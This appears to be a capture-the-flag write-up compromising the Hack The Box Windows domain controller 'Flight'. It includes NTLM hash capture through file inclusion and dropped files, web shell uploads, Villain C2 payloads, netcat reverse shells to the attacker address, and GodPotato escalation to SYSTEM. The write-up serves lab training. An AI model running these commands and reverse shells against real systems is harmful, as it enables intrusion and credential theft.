![image](https://github.com/user-attachments/assets/ef05ba8f-9ec4-4ecd-a15b-ac4f823e1d19)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration:

I started the enumeration by running a quick `RustScan` and identified multiple open ports on the target system:

```
rustscan -a 10.10.11.187 -- -A -T4 -vv -oN flight_nmap
```

![image](https://github.com/user-attachments/assets/4bc5c607-e649-42b7-a09d-493900201908)

```R
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-09-04 12:46:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=9/4%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=66D7F491%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
SEQ(SP=FC%GCD=1%ISR=105%TI=I%II=I%SS=S%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2024-09-04T12:47:19
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32072/tcp): CLEAN (Timeout)
|   Check 2 (port 46616/tcp): CLEAN (Timeout)
|   Check 3 (port 44855/udp): CLEAN (Timeout)
|   Check 4 (port 27585/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   221.03 ms 10.10.14.1
2   221.13 ms 10.10.11.187
```

From the port scan results, I identified the domain `flight.htb`, which I then added to my host configuration file.

## DNS enumeration:

Since port 53 was open, I proceeded to enumerate the DNS to check for any additional subdomains. The scan revealed two subdomains:

```
ffuf -H "Host: FUZZ.flight.htb" -u http://10.10.11.187/ -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 7069
```

![image](https://github.com/user-attachments/assets/a5f56ad7-fcb5-448f-ae3a-fcea43d980b1)

I added both subdomains, `school` and `deltek`, to my host configuration file.

## Web Enumeration:

Next, I proceeded with web enumeration since the HTTP server was running on port 80. Upon browsing `flight.htb`, I encountered a flight booking website:

![image](https://github.com/user-attachments/assets/9fc596c1-0232-4706-bc15-bb1ed47b6f2c)

I conducted a directory search on the website but didn't find anything useful in the results:

![image](https://github.com/user-attachments/assets/435eabc2-883f-4ade-8270-4a0985c982f4)

After that, I navigated to `school.flight.htb` and found an aviation school website:

![image](https://github.com/user-attachments/assets/3fb4d274-ac6f-4984-bc08-5aa386db3c7a)

During the directory enumeration of the school website, I discovered a `/cgi-bin/printenv.pl` directory. Browsing through this directory revealed several internal details, including:

![image](https://github.com/user-attachments/assets/9a498232-6e85-4397-b0b1-6f7d18338dcb)

```
  - user: svc_apache
  - server: xampp
  - CGI version: 1.1
```

![image](https://github.com/user-attachments/assets/7c998d06-00c1-4239-924c-6e033e2b98ad)

Lastly, I performed an enumeration on `deltek.flight.htb` and observed that it was identical to `flight.htb`. A directory search here yielded the same results.

## Kerberos:

Next, I conducted enumeration on the Kerberos service to identify valid usernames. I used `kerbrute` for the enumeration, but the only result I found was the `Administrator` account:

```
kerbrute userenum --dc flight.htb -d flight.htb /usr/share/SecLists/Usernames/cirt-default-usernames.txt
```

![image](https://github.com/user-attachments/assets/a74c8686-50eb-4dfa-a496-20190d12d608)

## RPC & LDAP:

Next, I attempted RPC and LDAP enumeration using null authentication. However, both attempts failed as authentication was required:

![image](https://github.com/user-attachments/assets/ee2b2afa-197f-41ae-a6aa-ecadcbbda5af)

```
ldapsearch -x -H ldap://flight.htb -s base namingcontexts
```

![image](https://github.com/user-attachments/assets/da85c22a-67a9-4aad-ad67-c5d456c2d97e)

## SMB enumeration:

Next, I attempted SMB enumeration using NULL and Guest users, but neither attempt was successful.

![image](https://github.com/user-attachments/assets/7fdd5023-2e96-4db7-afed-243c3b7f1974)
![image](https://github.com/user-attachments/assets/734e2775-81f5-4282-8e3e-2d86e9ffb631)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initial Access:

Since I couldn't find an initial access vector, I revisited `school.flight.htb`. While examining the website, I discovered a file inclusion vulnerability in the application that allowed me to read any file present in the current web directory.

![image](https://github.com/user-attachments/assets/716f305d-a22e-4b15-b686-571c4e04b515)

By replacing `about.html` with `C:/xampp/cgi-bin/printenv.pl`, I was able to view the contents of the file:

![image](https://github.com/user-attachments/assets/e77f6397-2057-47a2-ae5e-4f8018bdb93d)

I attempted to check the contents of other files, such as `user.txt`, but this did not work. However, when I tested `index.php`, which is in the same web root directory, I successfully accessed its content. The `index.php` file revealed that the application has filters in place to prevent file inclusion attempts:

![image](https://github.com/user-attachments/assets/2081f4dc-0bfd-4de2-acb4-f2a1237a5b16)

Considering these filters, I tried forced authentication with my responder, but it was blocked:

![image](https://github.com/user-attachments/assets/dbb2ac62-56fc-4771-96f6-866d76090c76)

Since the host is running Windows, which also accepts forward slashes, I attempted the same action using forward slashes. This time, it succeeded, and I received a response on my responder:

![image](https://github.com/user-attachments/assets/8c618c75-c35d-4c9a-992f-d461e1106fdf)

I then used this hash in Hashcat and, within moments, successfully cracked it to retrieve the plaintext password:

![image](https://github.com/user-attachments/assets/83511d57-0fa6-4b70-b47a-f42be024a910)

## User enumeration:

With the password for the `svc_apache` user, I proceeded to enumerate the users and found 15 valid users on the target host:

```
nxc smb flight.htb -u svc_apache -p '*********' --users
```

![image](https://github.com/user-attachments/assets/582b423d-a467-4df9-af87-f07e1020fdfe)

## SMB Shares:

Next, I examined the available shares with the current user and found multiple shares accessible for read-only access:

```
nxc smb flight.htb -u svc_apache -p '********' --shares
```

![image](https://github.com/user-attachments/assets/12c09b6c-ea42-49b9-91f0-a5dd9880dfbe)

Using these credentials and `smbclientng`, I browsed through the SMB file shares and observed multiple files. However, I did not have write access to these shares.

```
smbclientng -u 'svc_apache' -p '**********' --target flight.htb
```

![image](https://github.com/user-attachments/assets/457d4ede-6eb2-44e8-82c0-9969f824b57b)

Despite having read permissions, I did not find any useful information in the shared folders:

![image](https://github.com/user-attachments/assets/cf2cc741-970b-4a70-bd8c-373b95fc0669)

### Password spray:

Since the SMB share is open and I have write access to one of the folders, my remaining option was to drop a file with the responder address to capture the NTLM hash. I initially attempted to use a `.lnk` file with the `slinky` module from `netexec`:

![image](https://github.com/user-attachments/assets/65582eae-a57b-49ce-861a-b3a26bbb1313)

However, this method did not work due to restrictions on file write extensions:

![image](https://github.com/user-attachments/assets/4c566744-5384-46dc-ba7b-69806b0d9dd1)

### AS-REP Roast & Kerberoast:

Before exploring the file shares, I attempted AS-REP roasting and Kerberoasting to obtain Kerberos hashes for any users. Unfortunately, neither attack was successful:

```
impacket-GetNPUsers flight.htb/s.moon@10.10.11.187 -usersfile users.txt
```

![image](https://github.com/user-attachments/assets/62afadb7-764f-47d9-b1d3-e6bca1001d8d)

```
nxc ldap flight.htb -u s.moon -p '********' --kerberoasting kerb.out
```

![image](https://github.com/user-attachments/assets/0a51f13d-24c7-44b7-b7bc-b761a9ba12d0)

### Forced Authentication Using Shortcut Files

Since, the SMB share is open & I have write access on one of the folder, the only option left here for me is to drop a file with the respoder address to steal the NTLM hash. In order to achieve this I started with the `.lnk` file for which I used `slinky` module available in `netexec`:

```
nxc smb flight.htb -u s.moon -p '********' -M slinky -o Name=TestFiler server=10.10.14.5
```

However, this method did not work due to restrictions on file write extensions:

![image](https://github.com/user-attachments/assets/edd9d0e4-f3c0-4e75-a06b-c045e2be5146)

After researching alternative methods, I found a tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) from an `ippsec` video. This tool generates 21 different types of files to capture NTLM hashes.

Using `ntlm_theft`, I generated all the file types:

```
python3 ntlm_theft.py -g all -s 10.10.14.5 -f TestingTest
```

![image](https://github.com/user-attachments/assets/b608d16a-edbc-45d9-927e-32f3e3af978e)

After generating the files, I began uploading them one by one. I started my responder and uploaded `desktop.ini`:

```
sudo responsder -I tun0
```

Shortly after, the user `C.bum` accessed the Shared folder, resulting in a hit on my responder with their NTLMv2 hash:

![image](https://github.com/user-attachments/assets/10064ca4-57b6-4d16-b0ad-330b95a63132)

I then cracked the hash using John the Ripper and retrieved the plaintext password:

![image](https://github.com/user-attachments/assets/784d119e-c2e6-4a1a-826d-0bb201228783)

### Uploading Web Shell:

With access to the `c.bum` account, I revisited the shares and discovered that I had write access to the Web directory:

![image](https://github.com/user-attachments/assets/0ecdbc29-5a98-43a2-b0e3-9ec6a0a90945)

I authenticated to this file share using `smbclient-ng` and uploaded a PHP-based web shell:

![image](https://github.com/user-attachments/assets/47258ee1-b205-468f-8f86-fb0d97a0d0e1)

After uploading, I navigated to the directory and confirmed that the web shell was accessible. Running the `whoami` command revealed that the shell was operating under the `svc_apache` user:

![image](https://github.com/user-attachments/assets/12d9c5f1-b3e8-44be-9898-6dfaed28eff4)

I then initiated `Villian-C2`, generated a payload for a callback, and executed it on the target. This resulted in a session connecting back to my Kali host:🙂

```
generate payload=windows/hoaxshell/powershell_iex lhost=tun0 encode    #from villian c2
```

![image](https://github.com/user-attachments/assets/751c009b-00e8-4230-9277-2cf1f3824d5e)

I used Villian-C2 for two main reasons:

  - It offers a conpty-shell option, which is very helpful and time-saving.
  - Its payloads can bypass older versions of Windows Defender. I noticed that my web shell was removed after a while, indicating the presence of some form of antivirus.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral Movement:

After gaining shell access, I began exploring options for lateral movement. I first checked the privileges of the current user but did not find any special privileges or associations with privileged groups:

```
net user svc_apache

whoami /all
```

![image](https://github.com/user-attachments/assets/072888b5-6c06-42f4-9714-b8b209a40409)

![image](https://github.com/user-attachments/assets/199c0276-d7ee-4c29-8f65-7937f27d8e28)

I then searched for directories to see if there were any stored passwords or hardcoded credentials in scripts. However, I did not find anything useful, and in some directories, I lacked the necessary permissions.

## svc_apache -> c.bum

Next, I examined the open TCP ports on the machine and found that ports 5985 and 8000 were open. These ports did not appear in the initial port scan, likely due to firewall restrictions:

```
netstat -ant | select-string "tcp"
```

![image](https://github.com/user-attachments/assets/413a98df-ed0a-4569-b1f7-daeb02b09e96)

### Port Forwarding:

To access the open ports from my Kali host, I used `ligolo-ng` for port forwarding. I deployed the Ligolo agent on the Windows host and followed these steps to set up tunneling:

```
sudo ip tuntap add user kali mode tun ligolo #to add ligolo interface

sudo ip link set ligolo up #to start ligolo interface

./proxy -selfcert #to start ligolo proxy with self certificate

.\agent.exe -connect kali_ip:11601 -ignore-cert #to connect back to our proxy from target host

session > start

sudo ip route add 240.0.0.1/32 dev ligolo #to add new route of target host
```

![image](https://github.com/user-attachments/assets/deea0dcd-508e-437a-811c-d0613b2d6ade)

After setting up the route, I accessed the web service on port 8000. I discovered it was a flight booking application:

![image](https://github.com/user-attachments/assets/3d6a7ae6-5b30-4c24-99b5-21fe538d294d)

Next, I attempted to authenticate with `c.bum` using the WinRM protocol, as I had valid credentials for this user. However, I was unable to log in due to insufficient rights:

```
evil-winrm -i 240.0.0.1 -u 'c.bum' -p '**********'
```

![image](https://github.com/user-attachments/assets/e901444b-0b2f-4162-a178-b85f9ce4293f)

### Shell as c.bum:

Upon checking the group memberships, I found that the `c.bum` user is part of the `WebDevs` group, which likely grants permissions to the web directory:

![image](https://github.com/user-attachments/assets/2ec87a45-4aac-4490-ae77-3ccc49b15500)

```
net user c.bum
```

![image](https://github.com/user-attachments/assets/d3328530-1ab7-4c7f-916a-64637a7f38cd)

To access the web root folder, I needed shell access as `c.bum`, which I did not currently possess. Despite having the valid password, I explored various methods to obtain a shell. After some research and references, I discovered the tool [RunasCs](https://github.com/antonioCoco/RunasCs), which can be used in the current shell without spawning a new shell like the traditional `runas` command.

I downloaded and transferred the `RunasCs` binary to the target host and executed it with `c.bum` credentials, using the `-r` option to obtain a reverse shell on my netcat listener:

```
.\RunasCs.exe c.bum ******* powershell.exe -r 10.10.14.5:4443
```

Immediately after executing the command, I received a session in my Villian-C2:

![image](https://github.com/user-attachments/assets/6dc1dfe7-5066-44dc-b6fa-43a87ca7f7ad)

## Shell as iis apppool\defaultapppool:

After gaining shell access as `c.bum`, I navigated to the web development folder located at `C:\inetpub\development` and attempted to upload a PHP webshell:

![image](https://github.com/user-attachments/assets/3086116f-a78b-4844-8750-e66adb37d66d)

Unfortunately, the PHP webshell did not work as expected:

![image](https://github.com/user-attachments/assets/207937da-9676-4c93-970f-cd4c9a08e71f)

I then switched to an ASPX-based webshell and uploaded it to the development directory. This time, I was able to successfully access the webshell:

![image](https://github.com/user-attachments/assets/a9c53412-5e4a-49e8-8931-b6c2b8ec800e)

I executed a Villian-C2 payload and received a reverse session:

![image](https://github.com/user-attachments/assets/52cbba08-715a-48fa-8ba4-76b2af5fd742)

However, this shell proved unstable. To remedy this, I uploaded the netcat binary to the target host and executed it through the ASPX shell:

```
C:\temp\nc64.exe -e cmd.exe 10.10.14.5 4444
```

This provided me with an interactive shell:

![image](https://github.com/user-attachments/assets/bf8bbaaa-dd26-42fb-99dc-de8858922755)

## Shell as SYSTEM:

With a stable shell in place, I checked the privileges of the current user and discovered that it had the `SeImpersonatePrivilege`. This indicated that I could use the Potato exploit to escalate to SYSTEM privileges:

![image](https://github.com/user-attachments/assets/1688f63f-3c02-413c-9225-3167815d4783)

I utilized the [GodPotato exploit](https://github.com/BeichenDream/GodPotato/releases) to exploit this vulnerability. After uploading the exploit to the target host, I executed `GodPotato-NET4.exe` with the netcat binary to obtain a reverse shell:

```
.\GodPotato-NET4.exe -cmd "nc64.exe 10.10.14.5 4433 -e cmd"
```

Immediately after execution, I received a connection back to my netcat listener with SYSTEM privileges: (pwn3d!🎉)

![image](https://github.com/user-attachments/assets/982b24c2-1828-4582-9687-c4bc4578f54c)

With SYSTEM access, I retrieved both the user and root flags from the host.
